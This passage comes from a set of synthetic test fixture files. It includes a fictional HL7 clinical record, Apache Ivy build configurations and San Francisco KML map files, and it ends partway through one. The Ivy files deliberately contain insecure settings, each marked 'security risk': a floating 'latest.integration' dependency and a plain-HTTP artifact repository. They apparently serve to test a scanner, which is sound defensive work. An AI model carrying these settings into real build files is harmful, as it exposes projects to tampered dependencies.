        <raceCode code="2106-3" 
                  displayName="White" 
                  codeSystem="2.16.840.1.113883.6.238" 
                  codeSystemName="OMB Standards for Race and Ethnicity"/>
        
        <!-- Ethnicity -->
        <ethnicGroupCode code="2186-5" 
                         displayName="Not Hispanic or Latino" 
                         codeSystem="2.16.840.1.113883.6.238" 
                         codeSystemName="OMB Standards for Race and Ethnicity"/>
        
        <!-- Guardian (Emergency Contact) -->
        <guardian>
          <code code="WIFE" 
                displayName="Wife" 
                codeSystem="2.16.840.1.113883.5.111" 
                codeSystemName="RoleCode"/>
          <addr use="HP">
            <streetAddressLine>123 Main Street</streetAddressLine>
            <city>Anytown</city>
            <state>MA</state>
            <postalCode>02101</postalCode>
            <country>US</country>
          </addr>
          <telecom use="HP" value="tel:+1(555)234-5678"/>
          <guardianPerson>
            <name use="L">
              <given>Mary</given>
              <family>Smith</family>
            </name>
          </guardianPerson>
        </guardian>
        
        <!-- Birth Place -->
        <birthplace>
          <place>
            <addr>
              <city>Boston</city>
              <state>MA</state>
              <country>US</country>
            </addr>
          </place>
        </birthplace>
        
        <!-- Language Communication -->
        <languageCommunication>
          <languageCode code="en"/>
          <modeCode code="ESP" 
                    displayName="Expressed spoken" 
                    codeSystem="2.16.840.1.113883.5.60" 
                    codeSystemName="LanguageAbilityMode"/>
          <proficiencyLevelCode code="G" 
                                displayName="Good" 
                                codeSystem="2.16.840.1.113883.5.61" 
                                codeSystemName="LanguageAbilityProficiency"/>
          <preferenceInd value="true"/>
        </languageCommunication>
      </patient>
      
      <!-- Provider Organization -->
      <providerOrganization>
        <id root="2.16.840.1.113883.19.5.99999.1"/>
        <name>Good Health Clinic</name>
        <telecom use="WP" value="tel:+1(555)555-1003"/>
        <addr use="WP">
          <streetAddressLine>21 North Ave</streetAddressLine>
          <city>Burlington</city>
          <state>MA</state>
          <postalCode>01803</postalCode>
          <country>US</country>
        </addr>
      </providerOrganization>
    </patientRole>
  </recordTarget>
  
  <!-- Author (Document Creator) -->
  <author>
    <time value="20250723103000-0500"/>
    <assignedAuthor>
      <id root="2.16.840.1.113883.19.5.99999.456" extension="2981824"/>
      <addr use="WP">
        <streetAddressLine>21 North Ave</streetAddressLine>
        <city>Burlington</city>
        <state>MA</state>
        <postalCode>01803</postalCode>
        <country>US</country>
      </addr>
      <telecom use="WP" value="tel:+1(555)555-1003"/>
      <assignedPerson>
        <name>
          <given>Robert</given>
          <family>Johnson</family>
          <suffix>MD</suffix>
        </name>
      </assignedPerson>
      <representedOrganization>
        <id root="2.16.840.1.113883.19.5.99999.1"/>
        <name>Good Health Clinic</name>
      </representedOrganization>
    </assignedAuthor>
  </author>
  
  <!-- Data Enterer -->
  <dataEnterer>
    <time value="20250723103000-0500"/>
    <assignedEntity>
      <id root="2.16.840.1.113883.19.5.99999.456" extension="2981825"/>
      <addr use="WP">
        <streetAddressLine>21 North Ave</streetAddressLine>
        <city>Burlington</city>
        <state>MA</state>
        <postalCode>01803</postalCode>
        <country>US</country>
      </addr>
      <telecom use="WP" value="tel:+1(555)555-1003"/>
      <assignedPerson>
        <name>
          <given>Susan</given>
          <family>Miller</family>
        </name>
      </assignedPerson>
      <representedOrganization>
        <id root="2.16.840.1.113883.19.5.99999.1"/>
        <name>Good Health Clinic</name>
      </representedOrganization>
    </assignedEntity>
  </dataEnterer>
  
  <!-- Custodian (Document Custodian) -->
  <custodian>
    <assignedCustodian>
      <representedCustodianOrganization>
        <id root="2.16.840.1.113883.19.5.99999.1"/>
        <name>Good Health Clinic</name>
        <telecom use="WP" value="tel:+1(555)555-1003"/>
        <addr use="WP">
          <streetAddressLine>21 North Ave</streetAddressLine>
          <city>Burlington</city>
          <state>MA</state>
          <postalCode>01803</postalCode>
          <country>US</country>
        </addr>
      </representedCustodianOrganization>
    </assignedCustodian>
  </custodian>
  
  <!-- Legal Authenticator -->
  <legalAuthenticator>
    <time value="20250723103000-0500"/>
    <signatureCode code="S"/>
    <assignedEntity>
      <id root="2.16.840.1.113883.19.5.99999.456" extension="2981824"/>
      <addr use="WP">
        <streetAddressLine>21 North Ave</streetAddressLine>
        <city>Burlington</city>
        <state>MA</state>
        <postalCode>01803</postalCode>
        <country>US</country>
      </addr>
      <telecom use="WP" value="tel:+1(555)555-1003"/>
      <assignedPerson>
        <name>
          <given>Robert</given>
          <family>Johnson</family>
          <suffix>MD</suffix>
        </name>
      </assignedPerson>
      <representedOrganization>
        <id root="2.16.840.1.113883.19.5.99999.1"/>
        <name>Good Health Clinic</name>
      </representedOrganization>
    </assignedEntity>
  </legalAuthenticator>
  
  <!-- Document Encounter -->
  <componentOf>
    <encompassingEncounter>
      <id root="2.16.840.1.113883.19.5.99999.1" extension="9937012"/>
      <code code="99213" 
            displayName="Office outpatient visit 15 minutes" 
            codeSystem="2.16.840.1.113883.6.12" 
            codeSystemName="CPT"/>
      <effectiveTime>
        <low value="20250723100000-0500"/>
        <high value="20250723103000-0500"/>
      </effectiveTime>
      <responsibleParty>
        <assignedEntity>
          <id root="2.16.840.1.113883.19.5.99999.456" extension="2981824"/>
          <assignedPerson>
            <name>
              <given>Robert</given>
              <family>Johnson</family>
              <suffix>MD</suffix>
            </name>
          </assignedPerson>
        </assignedEntity>
      </responsibleParty>
      <encounterParticipant typeCode="ATND">
        <assignedEntity>
          <id root="2.16.840.1.113883.19.5.99999.456" extension="2981824"/>
          <code code="207Q00000X" 
                displayName="Family Medicine Physician" 
                codeSystem="2.16.840.1.113883.6.101" 
                codeSystemName="NUCC Health Care Provider Taxonomy"/>
          <assignedPerson>
            <name>
              <given>Robert</given>
              <family>Johnson</family>
              <suffix>MD</suffix>
            </name>
          </assignedPerson>
        </assignedEntity>
      </encounterParticipant>
      <location>
        <healthCareFacility>
          <id root="2.16.840.1.113883.19.5.99999.1"/>
          <code code="OUTPHARM" 
                displayName="Outpatient Pharmacy" 
                codeSystem="2.16.840.1.113883.1.11.17660" 
                codeSystemName="HL7 ServiceDeliveryLocationRoleType"/>
          <location>
            <name>Good Health Clinic</name>
            <addr use="WP">
              <streetAddressLine>21 North Ave</streetAddressLine>
              <city>Burlington</city>
              <state>MA</state>
              <postalCode>01803</postalCode>
              <country>US</country>
            </addr>
          </location>
          <serviceProviderOrganization>
            <name>Good Health Clinic</name>
          </serviceProviderOrganization>
        </healthCareFacility>
      </location>
    </encompassingEncounter>
  </componentOf>
  
  <!-- Document Body -->
  <component>
    <structuredBody>
      
      <!-- Allergies Section -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.6.1" extension="2015-08-01"/>
          <code code="48765-2" 
                displayName="Allergies and Adverse Reactions" 
                codeSystem="2.16.840.1.113883.6.1" 
                codeSystemName="LOINC"/>
          <title>Allergies and Adverse Reactions</title>
          <text>
            <table border="1" width="100%">
              <thead>
                <tr>
                  <th>Allergen</th>
                  <th>Reaction</th>
                  <th>Severity</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                <tr ID="allergy1">
                  <td>Penicillin</td>
                  <td>Hives, difficulty breathing</td>
                  <td>Severe</td>
                  <td>Active</td>
                </tr>
                <tr ID="allergy2">
                  <td>Shellfish</td>
                  <td>Nausea, vomiting</td>
                  <td>Moderate</td>
                  <td>Active</td>
                </tr>
              </tbody>
            </table>
          </text>
          
          <!-- Allergy Entry -->
          <entry typeCode="DRIV">
            <act classCode="ACT" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.30" extension="2015-08-01"/>
              <id root="2.16.840.1.113883.19.5.99999.1" extension="36592"/>
              <code code="48765-2" 
                    displayName="Allergies and Adverse Reactions" 
                    codeSystem="2.16.840.1.113883.6.1"/>
              <statusCode code="active"/>
              <effectiveTime>
                <low value="19950701"/>
              </effectiveTime>
              <entryRelationship typeCode="SUBJ">
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.7" extension="2014-06-09"/>
                  <id root="2.16.840.1.113883.19.5.99999.1" extension="36592"/>
                  <code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
                  <statusCode code="completed"/>
                  <effectiveTime>
                    <low value="19950701"/>
                  </effectiveTime>
                  <value xsi:type="CD" 
                         code="419511003" 
                         displayName="Propensity to adverse reactions to drug" 
                         codeSystem="2.16.840.1.113883.6.96" 
                         codeSystemName="SNOMED CT"/>
                  <participant typeCode="CSM">
                    <participantRole classCode="MANU">
                      <playingEntity classCode="MMAT">
                        <code code="70618" 
                              displayName="Penicillin" 
                              codeSystem="2.16.840.1.113883.6.88" 
                              codeSystemName="RxNorm"/>
                        <name>Penicillin</name>
                      </playingEntity>
                    </participantRole>
                  </participant>
                  <entryRelationship typeCode="MFST" inversionInd="true">
                    <observation classCode="OBS" moodCode="EVN">
                      <templateId root="2.16.840.1.113883.10.20.22.4.9" extension="2014-06-09"/>
                      <id root="2.16.840.1.113883.19.5.99999.1" extension="36592-1"/>
                      <code code="ASSERTION" codeSystem="2.16.840.1.113883.5.4"/>
                      <text><reference value="#allergy1"/></text>
                      <statusCode code="completed"/>
                      <value xsi:type="CD" 
                             code="247472004" 
                             displayName="Hives" 
                             codeSystem="2.16.840.1.113883.6.96"/>
                      <entryRelationship typeCode="SUBJ" inversionInd="true">
                        <observation classCode="OBS" moodCode="EVN">
                          <templateId root="2.16.840.1.113883.10.20.22.4.8" extension="2014-06-09"/>
                          <code code="SEV" 
                                displayName="Severity Observation" 
                                codeSystem="2.16.840.1.113883.5.4"/>
                          <statusCode code="completed"/>
                          <value xsi:type="CD" 
                                 code="24484000" 
                                 displayName="Severe" 
                                 codeSystem="2.16.840.1.113883.6.96"/>
                        </observation>
                      </entryRelationship>
                    </observation>
                  </entryRelationship>
                </observation>
              </entryRelationship>
            </act>
          </entry>
        </section>
      </component>
      
      <!-- Medications Section -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.1.1" extension="2014-06-09"/>
          <code code="10160-0" 
                displayName="History of Medication Use" 
                codeSystem="2.16.840.1.113883.6.1"/>
          <title>Medications</title>
          <text>
            <table border="1" width="100%">
              <thead>
                <tr>
                  <th>Medication</th>
                  <th>Dosage</th>
                  <th>Frequency</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                <tr ID="med1">
                  <td>Lisinopril 10mg tablets</td>
                  <td>10mg</td>
                  <td>Once daily</td>
                  <td>Active</td>
                </tr>
                <tr ID="med2">
                  <td>Metformin 500mg tablets</td>
                  <td>500mg</td>
                  <td>Twice daily with meals</td>
                  <td>Active</td>
                </tr>
              </tbody>
            </table>
          </text>
          
          <!-- Medication Entry -->
          <entry typeCode="DRIV">
            <substanceAdministration classCode="SBADM" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.16" extension="2014-06-09"/>
              <id root="2.16.840.1.113883.19.5.99999.1" extension="cdbd33f0-6cde-11db-9fe1-0800200c9a66"/>
              <text><reference value="#med1"/></text>
              <statusCode code="active"/>
              <effectiveTime xsi:type="IVL_TS">
                <low value="20240315"/>
                <high nullFlavor="NI"/>
              </effectiveTime>
              <effectiveTime xsi:type="PIVL_TS" institutionSpecified="true" operator="A">
                <period value="24" unit="h"/>
              </effectiveTime>
              <routeCode code="PO" 
                         displayName="Oral Route of Administration" 
                         codeSystem="2.16.840.1.113883.3.26.1.1" 
                         codeSystemName="NCI Thesaurus"/>
              <doseQuantity value="10" unit="mg"/>
              <consumable>
                <manufacturedProduct classCode="MANU">
                  <templateId root="2.16.840.1.113883.10.20.22.4.23" extension="2014-06-09"/>
                  <id root="2.16.840.1.113883.19.5.99999.1" extension="med1"/>
                  <manufacturedMaterial>
                    <code code="314077" 
                          displayName="Lisinopril 10mg oral tablet" 
                          codeSystem="2.16.840.1.113883.6.88" 
                          codeSystemName="RxNorm"/>
                  </manufacturedMaterial>
                </manufacturedProduct>
              </consumable>
            </substanceAdministration>
          </entry>
        </section>
      </component>
      
      <!-- Problem List Section -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.5.1" extension="2015-08-01"/>
          <code code="11450-4" 
                displayName="Problem List" 
                codeSystem="2.16.840.1.113883.6.1"/>
          <title>Problem List</title>
          <text>
            <table border="1" width="100%">
              <thead>
                <tr>
                  <th>Problem</th>
                  <th>Date of Onset</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                <tr ID="problem1">
                  <td>Essential Hypertension</td>
                  <td>March 2024</td>
                  <td>Active</td>
                </tr>
                <tr ID="problem2">
                  <td>Type 2 Diabetes Mellitus</td>
                  <td>January 2023</td>
                  <td>Active</td>
                </tr>
              </tbody>
            </table>
          </text>
          
          <!-- Problem Entry -->
          <entry typeCode="DRIV">
            <act classCode="ACT" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.3" extension="2015-08-01"/>
              <id root="2.16.840.1.113883.19.5.99999.1" extension="ec8a6ff8-ed4b-4f7e-82c3-e98e58b45de7"/>
              <code code="CONC" codeSystem="2.16.840.1.113883.5.6"/>
              <statusCode code="active"/>
              <effectiveTime>
                <low value="20240315"/>
              </effectiveTime>
              <entryRelationship typeCode="SUBJ">
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.4" extension="2015-08-01"/>
                  <id root="2.16.840.1.113883.19.5.99999.1" extension="ab1791b0-5c71-11db-b0de-0800200c9a66"/>
                  <code code="282291009" 
                        displayName="Diagnosis" 
                        codeSystem="2.16.840.1.113883.6.96" 
                        codeSystemName="SNOMED CT"/>
                  <text><reference value="#problem1"/></text>
                  <statusCode code="completed"/>
                  <effectiveTime>
                    <low value="20240315"/>
                  </effectiveTime>
                  <value xsi:type="CD" 
                         code="59621000" 
                         displayName="Essential Hypertension" 
                         codeSystem="2.16.840.1.113883.6.96" 
                         codeSystemName="SNOMED CT"/>
                  <entryRelationship typeCode="REFR">
                    <observation classCode="OBS" moodCode="EVN">
                      <templateId root="2.16.840.1.113883.10.20.22.4.6"/>
                      <code code="33999-4" 
                            displayName="Status" 
                            codeSystem="2.16.840.1.113883.6.1"/>
                      <statusCode code="completed"/>
                      <value xsi:type="CE" 
                             code="55561003" 
                             displayName="Active" 
                             codeSystem="2.16.840.1.113883.6.96"/>
                    </observation>
                  </entryRelationship>
                </observation>
              </entryRelationship>
            </act>
          </entry>
        </section>
      </component>
      
      <!-- Vital Signs Section -->
      <component>
        <section>
          <templateId root="2.16.840.1.113883.10.20.22.2.4.1" extension="2015-08-01"/>
          <code code="8716-3" 
                displayName="Vital Signs" 
                codeSystem="2.16.840.1.113883.6.1"/>
          <title>Vital Signs</title>
          <text>
            <table border="1" width="100%">
              <thead>
                <tr>
                  <th>Date/Time</th>
                  <th>Blood Pressure</th>
                  <th>Heart Rate</th>
                  <th>Temperature</th>
                  <th>Weight</th>
                  <th>Height</th>
                </tr>
              </thead>
              <tbody>
                <tr ID="vitals1">
                  <td>July 23, 2025 10:00 AM</td>
                  <td>142/88 mmHg</td>
                  <td>78 bpm</td>
                  <td>98.6°F</td>
                  <td>185 lbs</td>
                  <td>70 inches</td>
                </tr>
              </tbody>
            </table>
          </text>
          
          <!-- Vital Signs Organizer -->
          <entry typeCode="DRIV">
            <organizer classCode="CLUSTER" moodCode="EVN">
              <templateId root="2.16.840.1.113883.10.20.22.4.26" extension="2015-08-01"/>
              <id root="2.16.840.1.113883.19.5.99999.1" extension="c6f88321-67ad-11db-bd13-0800200c9a66"/>
              <code code="46680005" 
                    displayName="Vital Signs" 
                    codeSystem="2.16.840.1.113883.6.96" 
                    codeSystemName="SNOMED CT"/>
              <statusCode code="completed"/>
              <effectiveTime value="20250723100000-0500"/>
              
              <!-- Blood Pressure -->
              <component>
                <observation classCode="OBS" moodCode="EVN">
                  <templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
                  <id root="2.16.840.1.113883.19.5.99999.1" extension="c6f88321-67ad-11db-bd13-0800200c9a66-bp"/>
                  <code code="35094-2" 
                        displayName="Blood Pressure Panel" 
                        codeSystem="2.16.840.1.113883.6.1"/>
                  <text><reference value="#vitals1"/></text>
                  <statusCode code="completed"/>
                  <effectiveTime value="20250723100000-0500"/>
                  <entryRelationship typeCode="COMP">
                    <observation classCode="OBS" moodCode="EVN">
                      <templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
                      <id root="2.16.840.1.113883.19.5.99999.1" extension="c6f88321-67ad-11db-bd13-0800200c9a66-sysbp"/>
                      <code code="8480-6" 
                            displayName="Systolic Blood Pressure" 
                            codeSystem="2.16.840.1.113883.6.1"/>
                      <statusCode code="completed"/>
                      <effectiveTime value="20250723100000-0500"/>
                      <value xsi:type="PQ" value="142" unit="mm[Hg]"/>
                    </observation>
                  </entryRelationship>
                  <entryRelationship typeCode="COMP">
                    <observation classCode="OBS" moodCode="EVN">
                      <templateId root="2.16.840.1.113883.10.20.22.4.27" extension="2014-06-09"/>
                      <id root="2.16.840.1.113883.19.5.99999.1" extension="c6f88321-67ad-11db-bd13-0800200c9a66-diabp"/>
                      <code code="8462-4" 
                            displayName="Diastolic Blood Pressure" 
                            codeSystem="2.16.840.1.113883.6.1"/>
                      <statusCode code="completed"/>
                      <effectiveTime value="20250723100000-0500"/>
                      <value xsi:type="PQ" value="88" unit="mm[Hg]"/>
                    </observation>
                  </entryRelationship>
                </observation>
              </component>
            </organizer>
          </entry>
        </section>
      </component>
      
    </structuredBody>
  </component>
</ClinicalDocument>
</file>

<file path="sample_data/test_files_synthetic/small/ivy/ivy.xml">
<?xml version="1.0" encoding="UTF-8"?>
<ivy-module version="2.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:noNamespaceSchemaLocation="http://ant.apache.org/ivy/schemas/ivy.xsd">
    
    <info organisation="com.example" module="webapp" revision="1.2.3" status="release"
          publication="20250124120000">
        <license name="Apache 2.0" url="http://www.apache.org/licenses/LICENSE-2.0"/>
        <description homepage="http://example.com/webapp">
            A sample web application demonstrating Ivy dependency management
        </description>
        <ivyauthor name="John Doe" url="http://johndoe.example.com"/>
        <ivyauthor name="Jane Smith" url="http://janesmith.example.com"/>
    </info>
    
    <configurations>
        <conf name="default" visibility="public" description="Default configuration"/>
        <conf name="compile" visibility="public" description="Compile time dependencies"/>
        <conf name="runtime" extends="compile" visibility="public" description="Runtime dependencies"/>
        <conf name="test" extends="runtime" visibility="private" description="Test dependencies"/>
        <conf name="provided" visibility="public" description="Provided dependencies"/>
        <conf name="optional" visibility="public" description="Optional dependencies"/>
    </configurations>
    
    <publications>
        <artifact name="webapp" type="war" ext="war" conf="default"/>
        <artifact name="webapp-sources" type="source" ext="jar" conf="default" classifier="sources"/>
        <artifact name="webapp-javadoc" type="javadoc" ext="jar" conf="default" classifier="javadoc"/>
    </publications>
    
    <dependencies>
        <!-- Web framework dependencies -->
        <dependency org="org.springframework" name="spring-webmvc" rev="5.3.21" conf="compile->default"/>
        <dependency org="org.springframework" name="spring-context" rev="5.3.21" conf="compile->default"/>
        <dependency org="org.springframework" name="spring-web" rev="5.3.21" conf="compile->default"/>
        
        <!-- Database dependencies -->
        <dependency org="org.hibernate" name="hibernate-core" rev="5.6.9.Final" conf="compile->default"/>
        <dependency org="mysql" name="mysql-connector-java" rev="8.0.29" conf="runtime->default"/>
        <dependency org="com.zaxxer" name="HikariCP" rev="4.0.3" conf="runtime->default"/>
        
        <!-- Logging dependencies -->
        <dependency org="org.slf4j" name="slf4j-api" rev="1.7.36" conf="compile->default"/>
        <dependency org="ch.qos.logback" name="logback-classic" rev="1.2.11" conf="runtime->default"/>
        
        <!-- Servlet API (provided by container) -->
        <dependency org="javax.servlet" name="javax.servlet-api" rev="4.0.1" conf="provided->default"/>
        
        <!-- Test dependencies -->
        <dependency org="junit" name="junit" rev="4.13.2" conf="test->default"/>
        <dependency org="org.springframework" name="spring-test" rev="5.3.21" conf="test->default"/>
        <dependency org="org.mockito" name="mockito-core" rev="4.6.1" conf="test->default"/>
        
        <!-- Dynamic version example (security risk) -->
        <dependency org="commons-lang" name="commons-lang" rev="latest.integration" conf="compile->default"/>
        
        <!-- Version range example -->
        <dependency org="commons-collections" name="commons-collections" rev="[3.2,4.0)" conf="compile->default"/>
        
        <!-- Dependency with artifacts and excludes -->
        <dependency org="org.apache.struts" name="struts2-core" rev="2.5.30" conf="compile->default">
            <artifact name="struts2-core" type="jar"/>
            <exclude org="commons-logging" module="commons-logging"/>
            <exclude org="log4j" module="log4j"/>
        </dependency>
        
        <!-- Transitive disabled -->
        <dependency org="some.external" name="external-lib" rev="1.0.0" conf="compile->default" 
                    transitive="false"/>
        
        <!-- Changing dependency -->
        <dependency org="snapshot.repo" name="snapshot-lib" rev="1.0-SNAPSHOT" conf="test->default"
                    changing="true"/>
        
        <!-- Optional dependency -->
        <dependency org="org.apache.poi" name="poi" rev="5.2.2" conf="optional->default"/>
        
    </dependencies>
    
</ivy-module>
</file>

<file path="sample_data/test_files_synthetic/small/ivy/ivysettings.xml">
<?xml version="1.0" encoding="UTF-8"?>
<ivysettings>
    
    <settings defaultResolver="main-chain" 
              defaultConflictManager="latest-revision"
              validate="true"
              checkExactRevision="false"/>
    
    <resolvers>
        <!-- Main resolver chain -->
        <chain name="main-chain" returnFirst="true">
            <!-- Local repository first -->
            <filesystem name="local-repo">
                <ivy pattern="${ivy.settings.dir}/repository/[organisation]/[module]/ivy-[revision].xml"/>
                <artifact pattern="${ivy.settings.dir}/repository/[organisation]/[module]/[artifact]-[revision].[ext]"/>
            </filesystem>
            
            <!-- Corporate Maven repository -->
            <ibiblio name="corporate-maven" 
                     m2compatible="true" 
                     root="https://nexus.company.com/repository/maven-public/"
                     checkmodified="true"/>
            
            <!-- Maven Central -->
            <ibiblio name="maven-central" 
                     m2compatible="true" 
                     root="https://repo1.maven.org/maven2/"
                     checkmodified="false"/>
            
            <!-- Apache Snapshot Repository -->
            <ibiblio name="apache-snapshots"
                     m2compatible="true"
                     root="https://repository.apache.org/snapshots/"
                     changingPattern=".*SNAPSHOT"
                     checkmodified="true"/>
            
            <!-- Insecure HTTP repository (security risk) -->
            <ibiblio name="insecure-repo"
                     m2compatible="true"
                     root="http://insecure-repo.example.com/maven2/"
                     checkmodified="false"/>
        </chain>
        
        <!-- Shared resolver for internal modules -->
        <filesystem name="shared-repo">
            <ivy pattern="${shared.repo.dir}/[organisation]/[module]/ivy-[revision].xml"/>
            <artifact pattern="${shared.repo.dir}/[organisation]/[module]/[artifact]-[revision].[ext]"/>
        </filesystem>
        
        <!-- URL resolver for specific artifacts -->
        <url name="external-artifacts">
            <ivy pattern="https://external.example.com/ivy/[organisation]/[module]/[revision]/ivy.xml"/>
            <artifact pattern="https://external.example.com/artifacts/[organisation]/[module]/[revision]/[artifact].[ext]"/>
        </url>
    </resolvers>
    
    <modules>
        <!-- Internal modules use shared repository -->
        <module organisation="com.company.*" name="*" resolver="shared-repo"/>
        
        <!-- External dependencies use main chain -->
        <module organisation="*" name="*" resolver="main-chain"/>
        
        <!-- Specific conflict management for problematic libraries -->
        <module organisation="commons-logging" name="*" 
                conflict-manager="strict" 
                resolver="maven-central"/>
    </modules>
    
    <caches>
        <cache name="default-cache" 
               basedir="${ivy.cache.dir}" 
               useOrigin="true"
               lockStrategy="artifact-lock"/>
    </caches>
    
    <conflict-managers>
        <latest-revision name="latest-revision"/>
        <all name="strict"/>
    </conflict-managers>
    
</ivysettings>
</file>

<file path="sample_data/test_files_synthetic/small/ivy/library-ivy.xml">
<?xml version="1.0" encoding="UTF-8"?>
<ivy-module version="2.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:noNamespaceSchemaLocation="http://ant.apache.org/ivy/schemas/ivy.xsd">
    
    <info organisation="com.example.lib" module="utility-library" revision="2.1.0" 
          status="milestone" publication="20250120140000">
        <license name="MIT" url="https://opensource.org/licenses/MIT"/>
        <description>
            A utility library providing common functionality for enterprise applications.
            Includes data validation, encryption utilities, and configuration management.
        </description>
        <ivyauthor name="Library Team" url="mailto:library-team@example.com"/>
    </info>
    
    <configurations>
        <conf name="default" visibility="public" description="Default runtime configuration"/>
        <conf name="compile" visibility="public" description="Compile-time dependencies"/>
        <conf name="runtime" extends="compile" visibility="public" description="Runtime dependencies"/>
        <conf name="test" extends="runtime" visibility="private" description="Test-only dependencies"/>
        <conf name="javadoc" visibility="public" description="Documentation generation"/>
    </configurations>
    
    <publications>
        <artifact name="utility-library" type="jar" ext="jar" conf="default,runtime"/>
        <artifact name="utility-library-sources" type="source" ext="jar" 
                  conf="default" classifier="sources"/>
        <artifact name="utility-library-javadoc" type="javadoc" ext="jar" 
                  conf="javadoc" classifier="javadoc"/>
        <artifact name="utility-library-test" type="jar" ext="jar" 
                  conf="test" classifier="tests"/>
    </publications>
    
    <dependencies>
        <!-- Core utilities -->
        <dependency org="org.apache.commons" name="commons-lang3" rev="3.12.0" conf="compile->default"/>
        <dependency org="org.apache.commons" name="commons-collections4" rev="4.4" conf="compile->default"/>
        <dependency org="com.google.guava" name="guava" rev="31.1-jre" conf="compile->default"/>
        
        <!-- JSON processing -->
        <dependency org="com.fasterxml.jackson.core" name="jackson-core" rev="2.13.3" conf="compile->default"/>
        <dependency org="com.fasterxml.jackson.core" name="jackson-databind" rev="2.13.3" conf="compile->default"/>
        
        <!-- Validation -->
        <dependency org="javax.validation" name="validation-api" rev="2.0.1.Final" conf="compile->default"/>
        <dependency org="org.hibernate.validator" name="hibernate-validator" rev="6.2.3.Final" conf="runtime->default"/>
        
        <!-- Encryption -->
        <dependency org="org.bouncycastle" name="bcprov-jdk15on" rev="1.70" conf="compile->default"/>
        
        <!-- Configuration -->
        <dependency org="org.yaml" name="snakeyaml" rev="1.30" conf="runtime->default"/>
        
        <!-- Logging (provided - users choose implementation) -->
        <dependency org="org.slf4j" name="slf4j-api" rev="1.7.36" conf="compile->default"/>
        
        <!-- Test dependencies -->
        <dependency org="junit" name="junit" rev="4.13.2" conf="test->default"/>
        <dependency org="org.hamcrest" name="hamcrest-core" rev="2.2" conf="test->default"/>
        <dependency org="org.mockito" name="mockito-core" rev="4.6.1" conf="test->default"/>
        
        <!-- Documentation generation -->
        <dependency org="org.apache.maven.plugins" name="maven-javadoc-plugin" rev="3.4.0" 
                    conf="javadoc->default"/>
    </dependencies>
    
</ivy-module>
</file>

<file path="sample_data/test_files_synthetic/small/kml/area_polygon.kml">
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
  <Document>
    <name>Area Polygon</name>
    <description>Golden Gate Park boundary example</description>
    
    <Style id="park-style">
      <PolyStyle>
        <color>7f00ff00</color>
        <fill>1</fill>
        <outline>1</outline>
      </PolyStyle>
      <LineStyle>
        <color>ff00ff00</color>
        <width>2</width>
      </LineStyle>
    </Style>
    
    <Placemark>
      <name>Golden Gate Park</name>
      <description>Large urban park in San Francisco</description>
      <styleUrl>#park-style</styleUrl>
      <Polygon>
        <outerBoundaryIs>
          <LinearRing>
            <coordinates>
              -122.5128,37.7694,0
              -122.4531,37.7694,0
              -122.4531,37.7849,0
              -122.5128,37.7849,0
              -122.5128,37.7694,0
            </coordinates>
          </LinearRing>
        </outerBoundaryIs>
      </Polygon>
    </Placemark>
  </Document>
</kml>
</file>

<file path="sample_data/test_files_synthetic/small/kml/complex_document.kml">
<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:atom="http://www.w3.org/2005/Atom">
  <Document>
    <name>San Francisco Points of Interest</name>
    <description><![CDATA[A comprehensive guide to SF attractions with rich metadata]]></description>
    <atom:author>
      <atom:name>SF Tourism Board</atom:name>
    </atom:author>
    <atom:link href="https://sf.gov/tourism" />
    
    <Schema name="POIData" id="POI">
      <SimpleField type="string" name="Category">
        <displayName>Category</displayName>
      </SimpleField>
      <SimpleField type="int" name="Rating">
        <displayName>Rating (1-5)</displayName>
      </SimpleField>
      <SimpleField type="float" name="Price">
        <displayName>Entrance Fee</displayName>
      </SimpleField>
    </Schema>
    
    <Style id="attraction-style">
      <IconStyle>
        <color>ff0000ff</color>
        <scale>1.5</scale>
        <Icon>
          <href>http://maps.google.com/mapfiles/kml/shapes/star.png</href>
        </Icon>
      </IconStyle>
      <LabelStyle>
        <color>ffffffff</color>
        <scale>1.1</scale>
      </LabelStyle>
      <BalloonStyle>
        <bgColor>ff336699</bgColor>
        <textColor>ffffffff</textColor>
      </BalloonStyle>
    </Style>
    
    <Style id="restaurant-style">
      <IconStyle>
        <color>ff00ff00</color>
        <scale>1.0</scale>
        <Icon>
          <href>http://maps.google.com/mapfiles/kml/shapes/dining.png</href>
        </Icon>
      </IconStyle>
    </Style>
    
    <Folder>
      <name>Tourist Attractions</name>
      <description>Major tourist attractions in San Francisco</description>
      
      <Placemark>
        <name>Alcatraz Island</name>
        <description><![CDATA[
          Former federal prison, now a popular tourist destination.
          <br><br>
          Hours: 9:00 AM - 3:00 PM<br>
          Website: <a href="https://alcatrazcruises.com">Alcatraz Cruises</a>
        ]]></description>
        <Snippet maxLines="2">Historic prison island in SF Bay</Snippet>
        <styleUrl>#attraction-style</styleUrl>
        <ExtendedData>
          <SchemaData schemaUrl="#POI">
            <SimpleData name="Category">Historic Site</SimpleData>
            <SimpleData name="Rating">5</SimpleData>
            <SimpleData name="Price">39.90</SimpleData>
          </SchemaData>
        </ExtendedData>
        <Point>
          <altitudeMode>clampToGround</altitudeMode>
          <coordinates>-122.4230,37.8270,0</coordinates>
        </Point>
      </Placemark>
      
      <Placemark>
        <name>Lombard Street</name>
        <description>The most crooked street in the world</description>
        <styleUrl>#attraction-style</styleUrl>
        <ExtendedData>
          <SchemaData schemaUrl="#POI">
            <SimpleData name="Category">Landmark</SimpleData>
            <SimpleData name="Rating">4</SimpleData>
